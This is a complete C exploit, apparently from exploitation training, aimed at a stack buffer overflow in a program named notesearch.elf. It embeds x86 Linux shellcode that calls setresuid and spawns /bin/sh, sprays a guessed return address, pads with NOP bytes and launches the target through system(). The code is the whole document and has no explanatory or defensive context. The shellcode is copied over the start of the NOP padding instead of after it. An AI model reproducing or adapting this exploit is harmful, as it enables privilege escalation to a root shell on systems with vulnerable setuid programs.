#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char sc[]=
   "\x31\xc0\x31\xdb"
   "\x31\xc9\x99\xb0"
   "\xa4\xcd\x80\x6a"
   "\x0b\x58\x51\x68"
   "\x2f\x2f\x73\x68"
   "\x68\x2f\x62\x69"
   "\x6e\x89\xe3\x51"
   "\x89\xe2\x53\x89"
   "\xe1\xcd\x80"; //35bytes

int main(int argc, char *argv[]){
   unsigned int i, *ptr, ret, offset=270; //offset = 270, or argv[1];
   // of note, I found the nopsled to start at 249.
   char *cmd, *buf;
   cmd = (char *) malloc(200);
   bzero(cmd, 200);
   strcpy(cmd, "./notesearch.elf \'");
   buf = cmd + strlen(cmd);
   if(argc > 1){
      offset = atoi(argv[1]); //..or argv[1];
   }
   //set return address, 
   //using int i as point-of-reference
   ret = (unsigned int) &i - offset; 
   for(i=0; i<160; i+=4){ // 4 byte increment; memory address pointer
      *((unsigned int *)(buf+i)) = ret;  // set mem addr to ret addr
   }
   memset(buf, 0x90, 60);
   memcpy(buf, sc, sizeof(sc)-1);
   strcat(cmd, "\'");
   system(cmd); // run exploit
   free(cmd);
   return(0);
}
